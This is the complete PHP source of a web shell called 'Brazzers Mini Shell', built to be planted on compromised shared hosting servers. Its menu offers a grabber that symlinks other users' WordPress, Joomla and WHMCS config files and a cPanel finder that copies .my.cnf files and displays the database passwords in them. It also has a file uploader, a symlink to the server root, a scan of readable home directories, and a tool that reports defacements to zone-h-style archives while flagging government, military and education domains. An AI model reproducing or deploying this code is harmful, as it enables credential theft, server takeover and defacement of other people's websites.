<?php

echo "
<html>
<body bgcolor=black>
<head>
<style type=text/css>
body{
	background:#000000;;
}
a {
text-decoration:none;
}
a:hover{
border-bottom:1px solid aqua;
}
*{
	font-size:11px;
	font-family:Courier,Courier,Courier;
	color:white;
}
#menu a{
	padding:4px 18px;
	margin:0;
	background:darkred;
	text-decoration:none;
	letter-spacing:2px;
	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;

}
</style>

<title>Brazzers - TeamMATES</title>
</head>
<br><center><div id=menu>
<a href=?home>Home</a>
<a href=?grab>Grabber</a>
<a href=?cp>Cpanel finder</a>
<a href=?upl>Uploader</a>
</div></center>
<p>
<center>
<img src=https://lh6.googleusercontent.com/proxy/Lb9PL73QjAbrvNQoBErnVXo4v20SCRNAmFSv-ZZNU8pB5U5LwTVTx515XUkh-Sc-PIhz9uicOpLOwsg2HyMOD1hBPekIh1QNPzTFc0fmKihwZZCtIbA02oJPjuXsHd8yzBTcuJ6WUW3LZU67Pi-Q1LZ23_Z-CHE=s0-d width=272 height=315/><br /></center><br><center><div id=menu>
<a href=?jump>jumping</a>
<a href=?notif>Notifier</a>
<a href=?x=symlink>Symlink</a>
<a href=?about>About</a>
</div></center>
<br><br><center>".php_uname().";<br>";

if(isset($_GET["about"])){
echo "<font color=red><center>Recoded by Serizawa404<br>Thanks: Sinkaroid and kerupuk - UstadCage/font></center>";
}


############### MULAI DARI SINI #################

if(isset($_GET["grab"])){
echo "
<body bgcolor=black>
<form method='POST'>
<style>
textarea {
resize:none;
color: #000000 ;
background-color:#000000;  
font-size:8pt; color:#ffffff;
border:1px solid white ;
border-left: 4px solid white ;
width:543px;
height:400px;
}
input {
color: #000000;
border:1px dotted white;
}
</style>";
echo "<center>";

echo "</center><br><center>";
if (empty($_POST['config'])) { echo "<p><font face=Tahoma color=#007700 size=2pt>/etc/passwd content</p><br><form method=POST><textarea name=passwd class=area rows=15 cols=60>";
echo file_get_contents('/etc/passwd'); 
echo "</textarea><br><br><input name=config class=inputzbut size=100 value=Grab! type=submit><br></form></center><br>";
 }

if ($_POST['config']) {$function = $functions=@ini_get("disable_functions");if(eregi("symlink",$functions)){die ('<error>Symlink disabled :( </error>');}@mkdir('ustadtamvan_grabber', 0755);@chdir('ustadtamvan_grabber');
$htaccess="
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php 
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=$_POST["passwd"];
$passwd=explode("n",$passwd);
echo "<br><br><center><font color=#b0b000 size=2pt>grabbing, please wait ...</center><br>";
foreach($passwd as $pwd){
$pawd=explode(":",$pwd);$user =$pawd[0];
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');
@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');
@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');
@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');
@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');
@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');
@symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/config.php',$user.'-configgg.txt');
@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');
@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');
@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');
@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');
@symlink('/home/'.$user.'/public_html/db.php',$user.'-dbconf.txt');
@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');
@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-wp-test.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');
@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-joomla-protal.txt');
@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');
@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');
@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');
@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');
@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');
@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');
@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');
@symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');
@symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');
@symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');
@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');}
echo '<b class="cone"><font face="Tahoma" color="#00dd00" size="2pt"><b>Done -></b> <a target="_blank" href="ustadtamvan_grabber">Open configs</a></font></b>';
}
}


elseif(isset($_GET["home"]))
	{
	echo"<table><td align=center><body>
	<h2><font color=green></font></h2>";
	}
	elseif(isset($_GET["upl"]))
	{
	echo"<br><br><br><center><font color=red>";
		print "n";$disable_functions = @ini_get("disable_functions"); 
		echo "<br>DisablePHP=".$disable_functions; print "n"; 
		echo"<br><form method=post enctype=multipart/form-data>"; 
		echo"<input type=file name=f><input name=k type=submit id=k value=pencet><br>"; 
		  if($_POST["k"]==pencet)
	{ 
	if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
	echo"<b>".$_FILES["f"]["name"];
	}else{
	echo"<b>Gagal upload";
	}
	}
	}


/**
 * @author: FaisaL Ahmed aka rEd X
 * @mail: me@faialahmed.me
 * @Screenshot: http://prntscr.com/7c1p34
 * @Last Updated: 01 June 2015
*/
elseif(isset($_GET["cp"]))
	{
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}

echo '<style>
textarea {
resize:none;
color: red ;
background-color:#ffffff;  
font-size:8pt; color:#000000;
border:1px solid white ;
border-left: 4px solid white ;
width:543px;
height:400px;
}
input {
color: #000000;
border:1px dotted white;
}
</style>';
echo '<center>';

$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");

if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {

echo "<table align=center><tr><th valign=top bgcolor=darkgreen class=style2> COUNT </th><th valign=top bgcolor=darkgreen > DOMAIN </th><th valign=top bgcolor=darkgreen class=style2 > USER </th><th valign=top bgcolor=darkgreen class=style2 > Password </th><th valign=top bgcolor=darkgreen class=style2 > .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();

if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top style=border :2px solid white; width: 139px class=style2>".$count++."</td><td valign=top style= width: 139px; border :2px solid white  class=style2 ><a href=http://".$domain.":2082 target=_blank>".$domain."</a></td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$owner['name']."</td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$password."</td><td valign=top style=border :2px solid white  id=menu style=width: 139px><a href=".$owner['name'].".txt target=_blank>Click Here</a></td></tr>";
    

$dc++;
}

}
}
echo '</table>'; 
$total = $dc;

echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align=center><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top bgcolor=darkgreen class=style2 style=width: 139px>".$count++."</td><td valign=top bgcolor=darkgreen class=style2 style=width: 139px><a target=_blank href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td valign=top bgcolor=darkgreen class=style2 style=width: 139px>'.$r."</td><td valign=top bgcolor=darkgreen class=style2 style=width: 139px>".$password."</td><td valign=top bgcolor=darkgreen class=style2 style=width: 139px><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
				}
            }
			}
echo '</table>'; 
$total = $dc;
echo '<br><div class=result valign=top bgcolor=darkgreen class=style2 style=width: 139px >Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';

}
}else{
echo "<div class=result><i><font color=#FF0000>ERROR</font><br><font color=#FF0000>/var/named</font> or <font color=#FF0000>etc/named.conf</font> Not Accessible!</i></div>";
}
}


  ////////////////////////////////
   
   elseif(isset($_GET["jump"]))
	{
	 ($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
	set_time_limit(0);
	###################
	@$passwd = fopen('/etc/passwd','r');
	if (!$passwd) { die('<b>[-] Error : coudn`t read /etc/passwd</b>'); }
	$pub = array();
	$users = array();
	$conf = array();
	$i = 0;
	while(!feof($passwd))
	{
		$str = fgets($passwd);
		if ($i > 35)
			{
			$pos = strpos($str,':');
			$username = substr($str,0,$pos);
			$dirz = '/home/'.$username.'/public_html/';
			if (($username != ''))
				{
				if (is_readable($dirz))
					{
					array_push($users,$username);
					array_push($pub,$dirz);
					}
				}
			}
		$i++;
	}
	
	###################
	echo '<br>';
	echo "[+] Founded <font size=15 color=red> ".sizeof($users)." </font> entrys in /etc/passwd\n"."<br />";
	echo "[+] Founded <font color=red size=15> ".sizeof($pub)." </font> readable public_html directories\n"."<br />";
	echo "[~] Searching for passwords in config files...\n\n"."<br /><br /><br />";
	foreach ($users as $user)
		{
		$path = "/home/$user/public_html/";
		echo "<table bgcolor=black class=style2 ><td>";
		echo "<font color=white>[Ok] $path</font><br>";
		echo "</td></table>";
		}
	echo "\n";
}


  ////////////////////////////////
   
   elseif(isset($_GET["notif"]))
	{

set_time_limit (0);

echo "
<center>
<form method=POST>
Hacker Name :<br> <input type=text name=defacer size=32 style=border: solid 1px red><br>&nbsp&nbsp&nbspMirror : <br>
<select style=border: solid 1px red name=mirror>
<option>zone-h</option>
<option>dark-h</option>
<option>aljyyosh.org</option>
</select><br>
Domains :<br><textarea style= width: 678px; height: 302px ;border: solid 1px red name=domains></textarea><br>
<input type=submit value=Send name=go>
</form></center>";

if (!function_exists ("curl_init")){die ("This Script uses cURL Library, you must install first !<br><a href='http://au2.php.net/manual/en/curl.setup.php'>http://au2.php.net/manual/en/curl.setup.php</a>");}

if (@$_POST['go'])
{
	foreach (explode ("\n", $_POST['domains']) as $domain)
	{
		post ($domain, $_POST['defacer'], $_POST['mirror']);
	}
	echo "<br><br><a target=_blank href=http://zone-h.com/archive/published=0>Zone-h</a><br>";
	echo "<a target=_blank href=http://dark-h.org/onhold/?s=1>Dark-h</a><br>";
	echo "<a target=_blank href=http://aljyyosh.org/onhold.php>Aljyyosh.org</a>";
}

function post ($url, $defacer, $mirror)
{
	$ch = curl_init ();
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt ($ch, CURLOPT_POST, 1);

	switch ($mirror)
	{
	case "zone-h";
		curl_setopt ($ch, CURLOPT_URL, "http://www.zone-h.com/notify/single");
		curl_setopt ($ch, CURLOPT_POSTFIELDS, "defacer=$defacer&domain1=$url&hackmode=1&reason=1");
		if (preg_match ("/color=\"red\">OK<\/font><\/li>/", curl_exec ($ch)))
			echo "$url.&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span style=color: green>OK</span><br>";
		else
			echo "$url&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span style=color: red>Error</span><br>";
		break;
	case "dark-h";
		curl_setopt ($ch, CURLOPT_URL, "http://dark-h.org/notify/kaydet.php");
		curl_setopt ($ch, CURLOPT_POSTFIELDS, "hacker=$defacer&site=$url&gkodumuz=123456&zgkod=123456&kod=123456");
		curl_exec ($ch);
		echo "$url<br>";
		break;
	case "aljyyosh.org";
		curl_setopt ($ch, CURLOPT_URL, "http://aljyyosh.org/single.php");
		curl_setopt ($ch, CURLOPT_COOKIE, "alj=aljyyosh");
		curl_setopt ($ch, CURLOPT_POSTFIELDS, "hacker=$defacer&site=$url&how=1&why=1&addsite=Send");
		if (preg_match ("/<font color=red> OK<\/font>/", curl_exec ($ch)))
			echo "$url&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span style=color: green>OK</span><br>";
		else
			echo "$url&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span style=color: red>Error</span><br>";
		break;
	default:
		break;
	}
	curl_close ($ch);
}
}

	 elseif(isset($_GET['x']) && ($_GET['x'] == 'symlink')) {	 echo " <form action= method=post>";
 @set_time_limit(0);
 echo "<center>";
 @mkdir('sym',0777); 
$htaccess = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any"; $write =@fopen ('sym/.htaccess','w'); fwrite($write ,$htaccess); @symlink('/','sym/root'); $filelocation = basename(__FILE__); $read_named_conf = @file('/etc/named.conf'); if(!$read_named_conf) { echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; } else { echo "<br><br><div class='tmp'><table border=1 bordercolor=#FF0000 width=500 cellpadding=1 cellspacing=0><td>Domains</td><td>Users</td><td>symlink </td>"; foreach($read_named_conf as $subject){ if(eregi('zone',$subject)){ preg_match_all('#zone "(.*)"#',$subject,$string); flush(); if(strlen(trim($string[1][0])) >2){ $UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0])); $name = $UID['name'] ; @symlink('/','sym/root'); $name = $string[1][0]; $iran = '\.ir'; $israel = '\.il'; $indo = '\.id'; $sg12 = '\.sg'; $edu = '\.edu'; $gov = '\.gov'; $gose = '\.go'; $gober = '\.gob'; $mil1 = '\.mil'; $mil2 = '\.mi'; if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0]) or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])) { $name = "<div style= color: #FF0000 ; text-shadow: 0px 0px 1px red; >".$string[1][0].'</div>'; } echo " <tr> <td> <div class=dom><a target=_blank href=http://www.".$string[1][0].'/>'.$name.' </a> </div> </td> <td> '.$UID['name']." </td> <td> <a href=sym/root/home/".$UID['name']."/public_html target=_blank>Symlink </a> </td> </tr></div> "; flush(); } } } } echo "</center></table>"; } 


	
	echo "</div><center><b><br><br><br><font color=red>&copy 2015 Recoded By Serizawa404</font></center><b>
		<br><center>Brazzers Mini Shell</center><br>";

?>